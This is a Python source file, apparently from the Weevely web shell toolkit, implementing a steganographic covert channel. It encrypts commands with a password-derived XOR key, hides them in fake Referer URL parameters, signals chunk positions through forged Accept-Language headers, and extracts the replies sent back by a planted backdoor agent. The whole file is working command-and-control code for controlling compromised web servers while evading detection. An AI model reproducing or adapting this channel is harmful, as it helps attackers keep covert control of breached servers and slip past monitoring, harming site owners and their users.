from core.weexceptions import ChannelException, FatalException
from core.channels.stegaref.formatters import FirstRefererFormat
from core.loggers import dlog
from core import config
from mako.template import Template
import core.messages
import zlib
import hashlib
import base64
import urlparse
import re
import random
import string
import cookielib
import urllib2
import itertools
import utils
import os

referrer_templates_path = os.path.join(
    config.weevely_path,
    'core/channels/stegaref/referrers.tpl'
)
languages_list_path = os.path.join(
    config.weevely_path,
    'core/channels/stegaref/languages.txt'
)

class StegaRef:

    def __init__(self, url, password):

        # Generate the 8 char long main key. Is shared with the server and
        # used to check header, footer, and encrypt the payload.

        self.shared_key = hashlib.md5(password).hexdigest().lower()[:8]

        self.url = url
        url_parsed = urlparse.urlparse(url)
        self.url_base = '%s://%s' % (url_parsed.scheme, url_parsed.netloc)

        # init regexp for the returning data
        self.re_response = re.compile(
            "<%s>(.*)</%s>" %
            (self.shared_key[
                :8], self.shared_key[
                :8]), re.DOTALL)
        self.re_debug = re.compile(
            "<%sDEBUG>(.*?)</%sDEBUG>" %
            (self.shared_key[
                :8], self.shared_key[
                :8]), re.DOTALL)

        # Load and format the referrers templates (payload container)
        self.referrers_vanilla = self._load_referrers()

        # Load languages (trigger)
        self.languages = self._load_languages()

        # Load agents
        self.agents = utils.http.load_all_agents()

        # Init additional headers list
        self.additional_headers = config.additional_headers

    def send(self, original_payload, additional_handlers = []):

        # Generate session id and referrers
        session_id, referrers_data = self._prepare(original_payload)

        cj = cookielib.CookieJar()
        additional_handlers.append(urllib2.HTTPCookieProcessor(cj))
        opener = urllib2.build_opener(*additional_handlers)

        # When core.conf contains additional cookies, carefully merge
        # the new headers killing the needed ones
        additional_headers = []
        additional_ua = ''
        additional_cookie = ''
        for h in self.additional_headers:
            if h[0].lower() == 'user-agent' and h[1]:
                additional_ua = h[1]
            if h[0].lower() == 'cookie' and h[1]:
                cookies = h[1].rstrip(';').split('; ')
                for cookie in cookies:
                    name, value = cookie.split('=')
                    cj.set_cookie(
                        cookielib.Cookie(
                          version=0,
                          name=name,
                          value=value,
                          port=None, port_specified=False,
                          domain='',
                          domain_specified=True,
                          domain_initial_dot=True, path='/',
                          path_specified=True, secure=False,
                          expires=None, discard=True, comment=None,
                          comment_url=None, rest={'HttpOnly': None}
                        )
                    )
            elif h[0].lower() in ('accept', 'accept-language', 'referer'):
                # Skip sensible headers
                pass
            else:
                additional_headers.append(h)

        for referrer_index, referrer_data in enumerate(referrers_data):

            accept_language_header = self._generate_header_accept_language(
                referrer_data[1],
                session_id)
            accept_header = self._generate_header_accept()
            opener.addheaders = [
                ('Referer', referrer_data[0]),
                ('Accept-Language', accept_language_header),
                ('Accept', accept_header),
                ('User-Agent', (
                    additional_ua if additional_ua else random.choice(self.agents)
                    )
                )
            ] + additional_headers

            dlog.debug(
                '[H %i/%i]\n%s\n[C] %s' %
                (
                    referrer_index,
                    len(referrers_data) - 1,
                    '\n'.join('> %s: %s' % (h[0], h[1]) for h in opener.addheaders),
                    cj
                )
            )

            url = (
                self.url if not config.add_random_param_nocache
                else utils.http.add_random_url_param(self.url)
            )

            response = opener.open(url).read()

            if not response:
                continue

            # Multiple debug string may have been printed, using findall
            matched_debug = self.re_debug.findall(response)
            if matched_debug:
                dlog.debug('\n'.join(matched_debug))

            matched = self.re_response.search(response)
            if matched and matched.group(1):
                return zlib.decompress(
                    utils.strings.sxor(
                        base64.b64decode(
                            matched.group(1)),
                        self.shared_key))

    def _prepare(self, payload):

        obfuscated_payload = base64.urlsafe_b64encode(
            utils.strings.sxor(
                zlib.compress(payload),
                self.shared_key)).rstrip('=')

        # Generate a randomic seession_id that does not conflicts with the
        # payload chars

        for i in range(30):
            session_id = ''.join(
                random.choice(
                    string.ascii_lowercase) for x in range(2))

            # Generate 3-character urlsafe_b64encode header and footer
            # checkable on server side
            header = hashlib.md5(
                session_id +
                self.shared_key[
                    :4]).hexdigest().lower()[
                :3]
            footer = hashlib.md5(
                session_id +
                self.shared_key[
                    4:8]).hexdigest().lower()[
                :3]

            if (not header in obfuscated_payload and not footer in obfuscated_payload and not (
                    obfuscated_payload + footer).find(footer) != len(obfuscated_payload)):
                break
            elif i == 30:
                raise ChannelException(
                    core.messages.stegareferrer.error_generating_id)

        remaining_payload = header + obfuscated_payload + footer

        dlog.debug('DATA TO SEND: ' + remaining_payload)
        dlog.debug('HEADER: %s, FOOTER %s' % (header, footer))

        referrers = []

        # Randomize the order
        random.shuffle(self.referrers_vanilla)

        for referrer_index, referrer_vanilla_data in enumerate(itertools.cycle(self.referrers_vanilla)):

            # Separate the chunks sizes from the referrers
            referrer_vanilla, chunks_sizes_vanilla = referrer_vanilla_data

            # Clone chunk size to avoid .pop(0) consuming
            chunks_sizes = chunks_sizes_vanilla[:]

            # Separate the query from the rest
            referrer, query = referrer_vanilla.split('?', 1)

            # Apply template on the referrer host
            referrer = referrer.replace('http://${ url_base }', self.url_base)
            referrer = referrer.replace('http://${ url_agent }', self.url)

            referrer += '?'
            positions = []

            # Loop the parameters
            parameters = urlparse.parse_qsl(query)
            for parameter_index, content in enumerate(parameters):

                param, value = content

                # Prepend & to parameters
                if parameter_index > 0:
                    referrer += '&'

                # Add the templatized parameters
                if not value == '${ chunk }':
                    referrer += '%s=%s' % (param, value)
                else:

                    # Since the parameters over the ninth can't be indexed, this
                    # Cause an error.
                    if parameter_index > 9:
                        raise ChannelException(
                            core.messages.stegareferrer.error_chunk_position_i_s %
                            (parameter_index, referrer_vanilla))

                    # Pick a proper payload size
                    min_size, max_size = chunks_sizes.pop(0)

                    if not remaining_payload:
                        # If not payload, stuff padding
                        payload_size = 0
                        padding_size = random.randint(min_size, max_size)
                    elif len(remaining_payload) <= min_size:
                        # Not enough payload, stuff latest payload + padding
                        payload_size = len(remaining_payload)
                        padding_size = min_size - payload_size
                    elif min_size < len(remaining_payload) <= max_size:
                        # Enough payload to fill properly the parameter, stuff
                        # payload
                        payload_size = len(remaining_payload)
                        padding_size = 0
                    else:
                        # Overflowing payload, cut remaining payload to the max
                        payload_size = max_size
                        padding_size = 0

                    # Add crafted parameter
                    referrer += '%s=%s%s' % (param,
                                             remaining_payload[
                                                 :payload_size],
                                             utils.strings.randstr(
                                                 padding_size
                                              ))

                    # If some payload was inserted, add position and cut
                    # remaining payload
                    if payload_size:
                        positions.append(parameter_index)
                        remaining_payload = remaining_payload[payload_size:]

            referrers.append((referrer, positions))
            if not remaining_payload:
                break

        return session_id, referrers

    def _load_referrers(self):

        referrers_vanilla = []

        try:
            referrer_file = open(referrer_templates_path)
        except Exception as e:
            raise FatalException(
                core.messages.generic.error_loading_file_s_s %
                (referrer_templates_path, str(e)))

        for template in referrer_file.read().split('\n'):
            if not template.startswith('http'):
                continue

            referer_format = FirstRefererFormat(self.url)

            template_first_formatted = Template(
                template).render(tpl=referer_format)
            referrers_vanilla.append(
                (template_first_formatted, referer_format.chunks_sizes))

        return referrers_vanilla

    def _load_languages(self):

        try:
            language_file = open(languages_list_path)
        except Exception as e:
            raise FatalException(
                core.messages.generic.error_loading_file_s_s %
                (languages_list_path, str(e)))

        languages = language_file.read().split('\n')

        # Language list validation, every lower ascii starting letter should be
        # covered
        import string
        for letter in string.ascii_lowercase:
            if not any([l for l in languages if l.startswith(letter)]):
                raise ChannelException(error_language_start_letter_s % letter)

        return languages

    def _generate_header_accept_language(self, positions, session_id):

        # The total language number will be len(positions) + 1

        # Send session_id composing the two first languages
        accept_language = '%s,' % (random.choice(
            [l for l in self.languages if '-' in l and l.startswith(session_id[0])]))

        languages = [
            l for l in self.languages if '-' not in l and l.startswith(session_id[1])]
        accept_language += '%s;q=0.%i' % (
            random.choice(languages), positions[0])

        # Add remaining q= positions
        for position in positions[1:]:

            language = random.choice(languages)

            accept_language += ',%s;q=0.%i' % (language, position)

        return accept_language

    def _generate_header_accept(self):
        """Generate an accept header value"""

        content_types = [
            'text/html',
            'application/xhtml+xml',
            'application/xml',
            'text/plain'
        ]

        random.shuffle(content_types)

        header = []

        # Add first content type
        header.append('%s,' % content_types.pop())

        # Add some other content types with quality
        latest_quality = 9
        for r in range(0, random.randint(1, len(content_types))):
            header.append('%s;0.%i,' %(content_types.pop(), latest_quality))
            latest_quality = random.randint(latest_quality-2, latest_quality)

        # Add
        header.append('*/*')

        return ''.join(header)
